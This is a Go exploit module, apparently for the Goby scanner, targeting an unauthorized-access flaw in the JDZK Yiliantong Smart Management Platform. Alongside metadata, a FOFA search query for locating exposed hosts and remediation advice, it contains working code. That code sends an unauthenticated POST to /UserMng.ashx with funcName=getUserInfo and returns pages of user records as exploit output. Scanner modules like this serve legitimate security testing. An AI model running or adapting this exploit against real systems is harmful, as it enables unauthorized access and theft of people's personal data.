package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "JDZK Yiliantong Smart Management Platform UserMng.ashx Unauthorized Access Vulnerability",
    "Description": "<p>JDZK Yiliantong intelligent management platform is a set of Yiliantong system with powerful functions, stable operation, simple and convenient operation, beautiful user interface, and easy statistical data. No need to install, just configure in the background to log in in the browser.</p><p>There are unauthorized access vulnerabilities in the JDZK Yiliantong smart management platform. Attackers can control the entire system through unauthorized access vulnerabilities, which eventually leads to an extremely insecure state of the system.</p>",
    "Product": "JDZK-Yiliantong-Smart-MP",
    "Homepage": "http://www.szjocat.com/index.php/laypt/",
    "DisclosureDate": "2023-02-22",
    "PostTime": "2023-11-20",
    "Author": "14m3ta7k@gmail.com",
    "FofaQuery": "body=\"UserReservedTest.aspx\" || body=\"View/SystemMng/PwdChanges.aspx\"",
    "GobyQuery": "body=\"UserReservedTest.aspx\" || body=\"View/SystemMng/PwdChanges.aspx\"",
    "Level": "2",
    "Impact": "<p>There are unauthorized access vulnerabilities in the JDZK Yiliantong smart management platform. Attackers can control the entire system through unauthorized access vulnerabilities, which eventually leads to an extremely insecure state of the system.</p>",
    "Recommendation": "<p>The vulnerability has been officially fixed. Users are advised to contact the manufacturer to fix the vulnerability: <a href=\"http://www.szjocat.com/index.php/laypt/\">http://www.szjocat.com/index.php/laypt/</a></p><p>1. Set access policies through security devices such as firewalls and set whitelist access.</p><p>2. Unless necessary, it is prohibited to access the system from the public network.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "getUserInfo",
            "show": ""
        },
        {
            "name": "pageNumb",
            "type": "input",
            "value": "1",
            "show": "attackType=getUserInfo"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "HW-2023",
        "Unauthorized Access"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": "脸爱云一脸通智慧管理平台 UserMng.ashx 未授权访问漏洞",
            "Product": "JDZK-一脸通智慧管理平台",
            "Description": "<p>脸爱云一脸通智慧管理平台是一套功能强大，运行稳定，操作简单方便，用户界面美观，轻松统计数据的一脸通系统。无需安装，只需在后台配置即可在浏览器登录。<br></p><p>脸爱云一脸通智慧管理平台存在未授权访问漏洞，攻击者可通过未授权访问漏洞控制整个系统，最终导致系统处于极度不安全状态。<br></p>",
            "Recommendation": "<p>官方已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.szjocat.com/index.php/laypt/\">http://www.szjocat.com/index.php/laypt/</a></p><p>1、通过防火墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>脸爱云一脸通智慧管理平台存在未授权访问漏洞，攻击者可通过未授权访问漏洞控制整个系统，最终导致系统处于极度不安全状态。<br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "HW-2023",
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "JDZK Yiliantong Smart Management Platform UserMng.ashx Unauthorized Access Vulnerability",
            "Product": "JDZK-Yiliantong-Smart-MP",
            "Description": "<p>JDZK Yiliantong intelligent management platform is a set of Yiliantong system with powerful functions, stable operation, simple and convenient operation, beautiful user interface, and easy statistical data. No need to install, just configure in the background to log in in the browser.</p><p>There are unauthorized access vulnerabilities in the JDZK Yiliantong smart management platform. Attackers can control the entire system through unauthorized access vulnerabilities, which eventually leads to an extremely insecure state of the system.</p>",
            "Recommendation": "<p>The vulnerability has been officially fixed. Users are advised to contact the manufacturer to fix the vulnerability:&nbsp;<a href=\"http://www.szjocat.com/index.php/laypt/\">http://www.szjocat.com/index.php/laypt/</a></p><p>1. Set access policies through security devices such as firewalls and set whitelist access.</p><p>2. Unless necessary, it is prohibited to access the system from the public network.</p>",
            "Impact": "<p>There are unauthorized access vulnerabilities in the JDZK Yiliantong smart management platform. Attackers can control the entire system through unauthorized access vulnerabilities, which eventually leads to an extremely insecure state of the system.<br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "HW-2023",
                "Unauthorized Access"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10967"
}`

	sendPayloadCOXZIUDQE := func(hostInfo *httpclient.FixUrl, pageNumb string) (string, error) {
		postRequestConfig := httpclient.NewPostRequestConfig("/UserMng.ashx")
		postRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
		postRequestConfig.Data = "arr_search=%7B%22bmmc%22%3A%22%22%2C%22rfzt%22%3A%22%22%2C%22cardid%22%3A%22%22%2C%22klb%22%3A%22%22%2C%22ryxm%22%3A%22%22%2C%22rybh%22%3A%22%22%2C%22sex%22%3A%22%22%2C%22ryzt%22%3A%22%22%2C%22rfoperator%22%3A%22%22%2C%22EngName%22%3A%22%22%2C%22WeChat%22%3A%22%22%2C%22Tel%22%3A%22%22%2C%22groupname%22%3A%22%22%2C%22jituanname%22%3A%22%22%2C%22companyname%22%3A%22%22%2C%22startime%22%3A%22%22%2C%22endtime%22%3A%22%22%2C%22order%22%3A%22khrq+desc%22%7D&funcName=getUserInfo&page=" + pageNumb
		resp, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		if err == nil && resp != nil && strings.Contains(resp.Utf8Html, "rownum") && strings.Contains(resp.Utf8Html, "SchoolName") && strings.Contains(resp.Utf8Html, "userCount") {
			return resp.Utf8Html, nil
		}
		return "", err
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			respBody, err := sendPayloadCOXZIUDQE(hostInfo, "1")
			return len(respBody) > 0 && err == nil
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType == "getUserInfo" {
				pageNumb := goutils.B2S(stepLogs.Params["pageNumb"])
				respBody, err := sendPayloadCOXZIUDQE(expResult.HostInfo, pageNumb)
				if len(respBody) > 0 && err == nil {
					expResult.Success = true
					expResult.Output = respBody
				}
			}
			return expResult
		},
	))
}
